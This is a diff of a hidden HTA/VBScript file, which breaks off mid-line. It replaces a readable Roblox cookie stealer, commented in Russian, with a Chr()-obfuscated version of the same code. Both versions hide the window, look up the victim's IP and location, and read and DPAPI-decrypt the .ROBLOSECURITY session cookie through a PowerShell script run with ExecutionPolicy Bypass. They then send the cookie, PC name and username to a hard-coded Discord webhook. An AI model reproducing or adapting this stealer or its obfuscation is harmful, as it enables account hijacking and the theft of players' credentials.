@@ -2,319 +2,322 @@
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
-On Error Resume Next
+window.resizeTo 1,1:window.moveTo -32000,-32000
+Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
 
-Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
+Dim X14, X15, X16, X17, X18
+Set X14 = CreateObject((Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)))
+Set X15 = CreateObject((Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)))
 
-' === ОДИН ВЕБХУК ===
-WH = "https://discord.com/api/webhooks/1545410616955633707/lTyvG7dSoIzAWXu9UneNvmlCX-Kk4tECIbjY3cxMKynsuNoDNYOhYjjnchlwe0PK9AK8"
-PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+X16 = (Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(52)&Chr(53)&Chr(52)&Chr(49)&Chr(48)&Chr(54)&Chr(49)&Chr(54)&Chr(57)&Chr(53)&Chr(53)&Chr(54)&Chr(51)&Chr(51)&Chr(55)&Chr(48)&Chr(55)&Chr(47)&Chr(108)&Chr(84)&Chr(121)&Chr(118)&Chr(71)&Chr(55)&Chr(100)&Chr(83)&Chr(111)&Chr(73)&Chr(122)&Chr(65)&Chr(87)&Chr(88)&Chr(117)&Chr(57)&Chr(85)&Chr(110)&Chr(101)&Chr(78)&Chr(118)&Chr(109)&Chr(108)&Chr(67)&Chr(88)&Chr(45)&Chr(75)&Chr(107)&Chr(52)&Chr(116)&Chr(69)&Chr(67)&Chr(73)&Chr(98)&Chr(106)&Chr(89)&Chr(51)&Chr(99)&Chr(120)&Chr(77)&Chr(75)&Chr(121)&Chr(110)&Chr(115)&Chr(117)&Chr(78)&Chr(111)&Chr(68)&Chr(78)&Chr(89)&Chr(79)&Chr(104)&Chr(89)&Chr(106)&Chr(106)&Chr(110)&Chr(99)&Chr(104)&Chr(108)&Chr(119)&Chr(101)&Chr(48)&Chr(80)&Chr(75)&Chr(57)&Chr(65)&Chr(75)&Chr(56))
+X17 = X14.ExpandEnvironmentStrings((Chr(37)&Chr(67)&Chr(79)&Chr(77)&Chr(80)&Chr(85)&Chr(84)&Chr(69)&Chr(82)&Chr(78)&Chr(65)&Chr(77)&Chr(69)&Chr(37)))
+X18 = X14.ExpandEnvironmentStrings((Chr(37)&Chr(85)&Chr(83)&Chr(69)&Chr(82)&Chr(78)&Chr(65)&Chr(77)&Chr(69)&Chr(37)))
 
-' === ПОЛУЧЕНИЕ РЕАЛЬНОГО IP ===
-Function GetRealIP()
-    GetRealIP = "Unknown"
-    On Error Resume Next
-    Dim h, resp
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "GET", "https://api.ipify.org", False
-    h.Send
-    If h.Status = 200 Then GetRealIP = h.ResponseText
-    Set h = Nothing
+Function X0()
+    X0 = (Chr(85)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110))
+    Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
+    Dim X20, X21
+    Set X20 = CreateObject((Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48)))
+    X20.SetOption 2, 13056
+    X20.Open (Chr(71)&Chr(69)&Chr(84)), (Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(105)&Chr(112)&Chr(105)&Chr(102)&Chr(121)&Chr(46)&Chr(111)&Chr(114)&Chr(103)), False
+    X20.Send
+    If X20.Status = 200 Then X0 = X20.ResponseText
+    Set X20 = Nothing
 End Function
 
-' === ПОЛУЧЕНИЕ ГЕО (СТРАНА+ГОРОД) ===
-Function GetGeo(ip)
-    GetGeo = "Unknown / Unknown"
-    On Error Resume Next
-    If ip = "Unknown" Then Exit Function
-    Dim h, resp, country, city
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "GET", "https://ipapi.co/" & ip & "/json/", False
-    h.Send
-    If h.Status = 200 Then
-        resp = h.ResponseText
-        Dim reg, matches
-        Set reg = New RegExp
-        reg.Pattern = """country_name""\s*:\s*""([^""]+)"""
-        reg.Global = False
-        Set matches = reg.Execute(resp)
-        If matches.Count > 0 Then country = matches(0).SubMatches(0)
-        reg.Pattern = """city""\s*:\s*""([^""]+)"""
-        Set matches = reg.Execute(resp)
-        If matches.Count > 0 Then city = matches(0).SubMatches(0)
-        If Len(city) > 0 And Len(country) > 0 Then
-            GetGeo = city & ", " & country
-        ElseIf Len(country) > 0 Then
-            GetGeo = country
+Function X1(X22)
+    X1 = (Chr(85)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)&Chr(32)&Chr(47)&Chr(32)&Chr(85)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110))
+    Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
+    If X22 = (Chr(85)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)) Then Exit Function
+    Dim X20, X21, X65, X66
+    Set X20 = CreateObject((Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48)))
+    X20.SetOption 2, 13056
+    X20.Open (Chr(71)&Chr(69)&Chr(84)), (Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(105)&Chr(112)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(99)&Chr(111)&Chr(47)) & X22 & (Chr(47)&Chr(106)&Chr(115)&Chr(111)&Chr(110)&Chr(47)), False
+    X20.Send
+    If X20.Status = 200 Then
+        X21 = X20.ResponseText
+        Dim X67, X68
+        Set X67 = New RegExp
+        X67.Pattern = (Chr(34)&Chr(99)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(114)&Chr(121)&Chr(95)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(34)&Chr(92)&Chr(115)&Chr(42)&Chr(58)&Chr(92)&Chr(115)&Chr(42)&Chr(34)&Chr(40)&Chr(91)&Chr(94)&Chr(34)&Chr(93)&Chr(43)&Chr(41)&Chr(34))
+        X67.Global = False
+        Set X68 = X67.Execute(X21)
+        If X68.Count > 0 Then X65 = X68(0).SubMatches(0)
+        X67.Pattern = (Chr(34)&Chr(99)&Chr(105)&Chr(116)&Chr(121)&Chr(34)&Chr(92)&Chr(115)&Chr(42)&Chr(58)&Chr(92)&Chr(115)&Chr(42)&Chr(34)&Chr(40)&Chr(91)&Chr(94)&Chr(34)&Chr(93)&Chr(43)&Chr(41)&Chr(34))
+        Set X68 = X67.Execute(X21)
+        If X68.Count > 0 Then X66 = X68(0).SubMatches(0)
+        If Len(X66) > 0 And Len(X65) > 0 Then
+            X1 = X66 & (Chr(44)&Chr(32)) & X65
+        ElseIf Len(X65) > 0 Then
+            X1 = X65
         End If
     End If
-    Set h = Nothing
+    Set X20 = Nothing
 End Function
 
-' === ГРАББЕР ROBLOX ===
-Sub GrabRoblox()
-    Dim ip, geo, ipInfo
-    ip = GetRealIP()
-    geo = GetGeo(ip)
-    If geo = "Unknown / Unknown" Then
-        ipInfo = ip
+Sub X2()
+    Dim X22, X23, X24
+    X22 = X0()
+    X23 = X1(X22)
+    If X23 = (Chr(85)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)&Chr(32)&Chr(47)&Chr(32)&Chr(85)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)) Then
+        X24 = X22
     Else
-        ipInfo = ip & " / " & geo
+        X24 = X22 & (Chr(32)&Chr(47)&Chr(32)) & X23
     End If
     
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-    Dim i, fp, raw
-    For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+    Dim X25(4)
+    X25(0) = X14.ExpandEnvironmentStrings((Chr(37)&Chr(76)&Chr(79)&Chr(67)&Chr(65)&Chr(76)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))) & (Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116))
+    X25(1) = X14.ExpandEnvironmentStrings((Chr(37)&Chr(76)&Chr(79)&Chr(67)&Chr(65)&Chr(76)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))) & (Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116))
+    X25(2) = X14.ExpandEnvironmentStrings((Chr(37)&Chr(76)&Chr(79)&Chr(67)&Chr(65)&Chr(76)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))) & (Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115))
+    X25(3) = X14.ExpandEnvironmentStrings((Chr(37)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))) & (Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116))
+    X25(4) = X14.ExpandEnvironmentStrings((Chr(37)&Chr(85)&Chr(83)&Chr(69)&Chr(82)&Chr(80)&Chr(82)&Chr(79)&Chr(70)&Chr(73)&Chr(76)&Chr(69)&Chr(37))) & (Chr(92)&Chr(65)&Chr(112)&Chr(112)&Chr(68)&Chr(97)&Chr(116)&Chr(97)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116))
+    Dim X26, X27, X28
+    For X26 = 0 To 4
+        If X15.FileExists(X25(X26)) Then X27 = X25(X26): Exit For
     Next
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(subf.Name, "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp: Exit For
+    If Len(X27) = 0 Then
+        Dim X29: X29 = X14.ExpandEnvironmentStrings((Chr(37)&Chr(76)&Chr(79)&Chr(67)&Chr(65)&Chr(76)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))) & (Chr(92)&Chr(80)&Chr(97)&Chr(99)&Chr(107)&Chr(97)&Chr(103)&Chr(101)&Chr(115))
+        If X15.FolderExists(X29) Then
+            Dim X30, X31
+            Set X30 = X15.GetFolder(X29)
+            For Each X31 In X30.SubFolders
+                If InStr(X31.Name, (Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(88))) > 0 Then
+                    Dim X32: X32 = X31.Path & (Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(97)&Chr(116)&Chr(101)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116))
+                    If X15.FileExists(X32) Then X27 = X32: Exit For
                 End If
             Next
-            Set folder = Nothing
+            Set X30 = Nothing
         End If
     End If
-    If Len(fp) = 0 Then
-        Call PostEmbed("Roblox Logger - No Cookie", "IP: " & ipInfo & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16711680)
+    If Len(X27) = 0 Then
+        Call X3((Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(76)&Chr(111)&Chr(103)&Chr(103)&Chr(101)&Chr(114)&Chr(32)&Chr(45)&Chr(32)&Chr(78)&Chr(111)&Chr(32)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)), (Chr(73)&Chr(80)&Chr(58)&Chr(32)) & X24 & vbLf & (Chr(80)&Chr(67)&Chr(58)&Chr(32)) & X17 & vbLf & (Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32)) & X18, 16711680)
         Exit Sub
     End If
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then
-        Call PostEmbed("Roblox Logger - File Too Small", "Size: " & Len(raw) & " bytes" & vbLf & "IP: " & ipInfo & vbLf & "PC: " & PC, 16711680)
+    X28 = X9(X27)
+    If Len(X28) < 50 Then
+        Call X3((Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(76)&Chr(111)&Chr(103)&Chr(103)&Chr(101)&Chr(114)&Chr(32)&Chr(45)&Chr(32)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(84)&Chr(111)&Chr(111)&Chr(32)&Chr(83)&Chr(109)&Chr(97)&Chr(108)&Chr(108)), (Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(58)&Chr(32)) & Len(X28) & (Chr(32)&Chr(98)&Chr(121)&Chr(116)&Chr(101)&Chr(115)) & vbLf & (Chr(73)&Chr(80)&Chr(58)&Chr(32)) & X24 & vbLf & (Chr(80)&Chr(67)&Chr(58)&Chr(32)) & X17, 16711680)
         Exit Sub
     End If
     
-    Dim cookie: cookie = "": Dim approach: approach = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        approach = "JSON-DPAPI"
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then
-                    cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+    Dim X33: X33 = "": Dim X34: X34 = ""
+    If InStr(X28, (Chr(95)&Chr(124)&Chr(87)&Chr(65)&Chr(82)&Chr(78)&Chr(73)&Chr(78)&Chr(71))) > 0 Then X33 = X28: X34 = (Chr(80)&Chr(108)&Chr(97)&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(120)&Chr(116))
+    If Len(X33) = 0 And InStr(X28, (Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(68)&Chr(97)&Chr(116)&Chr(97))) > 0 Then
+        X34 = (Chr(74)&Chr(83)&Chr(79)&Chr(78)&Chr(45)&Chr(68)&Chr(80)&Chr(65)&Chr(80)&Chr(73))
+        Dim X35: X35 = InStr(X28, (Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(68)&Chr(97)&Chr(116)&Chr(97)&Chr(34)&Chr(58)&Chr(34)))
+        If X35 > 0 Then
+            X35 = X35 + 14
+            Dim X36: X36 = InStr(X35, X28, (Chr(34)))
+            If X36 > X35 Then
+                Dim X37: X37 = Mid(X28, X35, X36 - X35)
+                If Len(X37) > 100 Then
+                    X33 = X5(X37)
+                    If Len(X33) = 0 Then X33 = X37: X34 = (Chr(74)&Chr(83)&Chr(79)&Chr(78)&Chr(45)&Chr(82)&Chr(97)&Chr(119))
                 End If
             End If
         End If
     End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
-    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    If Len(X33) = 0 And InStr(X28, (Chr(46)&Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(83)&Chr(69)&Chr(67)&Chr(85)&Chr(82)&Chr(73)&Chr(84)&Chr(89))) > 0 Then X34 = (Chr(82)&Chr(97)&Chr(119)&Chr(45)&Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(83)&Chr(69)&Chr(67)&Chr(85)&Chr(82)&Chr(73)&Chr(84)&Chr(89)): Dim X41: X41 = InStr(X28, (Chr(46)&Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(83)&Chr(69)&Chr(67)&Chr(85)&Chr(82)&Chr(73)&Chr(84)&Chr(89))): X33 = Mid(X28, X41)
+    If Len(X33) = 0 Then X33 = X28: X34 = (Chr(82)&Chr(97)&Chr(119)&Chr(70)&Chr(105)&Chr(108)&Chr(101))
     
-    Dim cae: cae = InStr(cookie, "|$CAE")
-    If cae = 0 Then cae = InStr(cookie, "|_CAE")
-    If cae > 0 Then cookie = Mid(cookie, cae)
+    Dim X38: X38 = InStr(X33, (Chr(124)&Chr(36)&Chr(67)&Chr(65)&Chr(69)))
+    If X38 = 0 Then X38 = InStr(X33, (Chr(124)&Chr(95)&Chr(67)&Chr(65)&Chr(69)))
+    If X38 > 0 Then X33 = Mid(X33, X38)
     
-    ' === ОТПРАВКА: IP В ОПИСАНИИ, КУКА В ОТДЕЛЬНОМ ПОЛЕ EMBED ===
-    Dim embedDesc, cookieTrunc
-    embedDesc = "Method: " & approach & vbLf & "Cookie Size: " & Len(cookie) & " bytes" & vbLf & vbLf & "IP Location: " & ipInfo & vbLf & "Computer: " & PC & vbLf & "User: " & USER
+    Dim X39, X40
+    X39 = (Chr(77)&Chr(101)&Chr(116)&Chr(104)&Chr(111)&Chr(100)&Chr(58)&Chr(32)) & X34 & vbLf & (Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(32)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(58)&Chr(32)) & Len(X33) & (Chr(32)&Chr(98)&Chr(121)&Chr(116)&Chr(101)&Chr(115)) & vbLf & vbLf & (Chr(73)&Chr(80)&Chr(32)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(58)&Chr(32)) & X24 & vbLf & (Chr(67)&Chr(111)&Chr(109)&Chr(112)&Chr(117)&Chr(116)&Chr(101)&Chr(114)&Chr(58)&Chr(32)) & X17 & vbLf & (Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32)) & X18
     
-    ' === ОБРЕЗАЕМ КУКУ ДЛЯ ВСТАВКИ В EMBED (МАКСИМУМ 1024 СИМВОЛА) ===
-    If Len(cookie) > 1000 Then
-        cookieTrunc = Left(cookie, 997) & "..."
+    If Len(X33) > 1000 Then
+        X40 = Left(X33, 997) & (Chr(46)&Chr(46)&Chr(46))
     Else
-        cookieTrunc = cookie
+        X40 = X33
     End If
     
-    Call PostEmbedWithCookie("Roblox Cookie Logger", embedDesc, cookieTrunc, 16711680)
+    Call X4((Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(32)&Chr(76)&Chr(111)&Chr(103)&Chr(103)&Chr(101)&Chr(114)), X39, X40, 16711680)
 End Sub
 
-' === НОВАЯ ФУНКЦИЯ: EMBED + КУКА В ПОЛЕ ===
-Sub PostEmbedWithCookie(t, d, ck, col)
-    On Error Resume Next
-    Dim j
-    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & col & ",""fields"":[{""name"":""Cookie"",""value"":""```" & Ej(ck) & "```""}],""footer"":{""text"":""Logged: " & Ej(Now()) & """}}]}"
-    Dim h
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "application/json"
-    h.Send j
-    Set h = Nothing
+
+Sub X3(X42, X43, X44)
+    Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
+    Dim X47
+    X47 = (Chr(123)&Chr(34)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(100)&Chr(115)&Chr(34)&Chr(58)&Chr(91)&Chr(123)&Chr(34)&Chr(116)&Chr(105)&Chr(116)&Chr(108)&Chr(101)&Chr(34)&Chr(58)&Chr(34)) & X11(X42) & (Chr(34)&Chr(44)&Chr(34)&Chr(100)&Chr(101)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(34)&Chr(58)&Chr(34)) & X11(X43) & (Chr(34)&Chr(44)&Chr(34)&Chr(99)&Chr(111)&Chr(108)&Chr(111)&Chr(114)&Chr(34)&Chr(58)) & X44 & (Chr(125)&Chr(93)&Chr(125))
+    Dim X20
+    Set X20 = CreateObject((Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48)))
+    X20.SetOption 2, 13056
+    X20.Open (Chr(80)&Chr(79)&Chr(83)&Chr(84)), X16, False
+    X20.SetRequestHeader (Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101)), (Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(47)&Chr(106)&Chr(115)&Chr(111)&Chr(110))
+    X20.Send X47
+    Set X20 = Nothing
 End Sub
 
-' === ОРИГИНАЛЬНЫЕ ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ) ===
-Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
+Sub X4(X42, X43, X45, X46)
+    Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
+    Dim X47
+    X47 = (Chr(123)&Chr(34)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(100)&Chr(115)&Chr(34)&Chr(58)&Chr(91)&Chr(123)&Chr(34)&Chr(116)&Chr(105)&Chr(116)&Chr(108)&Chr(101)&Chr(34)&Chr(58)&Chr(34)) & X11(X42) & (Chr(34)&Chr(44)&Chr(34)&Chr(100)&Chr(101)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(34)&Chr(58)&Chr(34)) & X11(X43) & (Chr(34)&Chr(44)&Chr(34)&Chr(99)&Chr(111)&Chr(108)&Chr(111)&Chr(114)&Chr(34)&Chr(58)) & X46 & (Chr(44)&Chr(34)&Chr(102)&Chr(105)&Chr(101)&Chr(108)&Chr(100)&Chr(115)&Chr(34)&Chr(58)&Chr(91)&Chr(123)&Chr(34)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(34)&Chr(58)&Chr(34)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(34)&Chr(44)&Chr(34)&Chr(118)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(34)&Chr(58)&Chr(34)&Chr(96)&Chr(96)&Chr(96)) & X11(X45) & 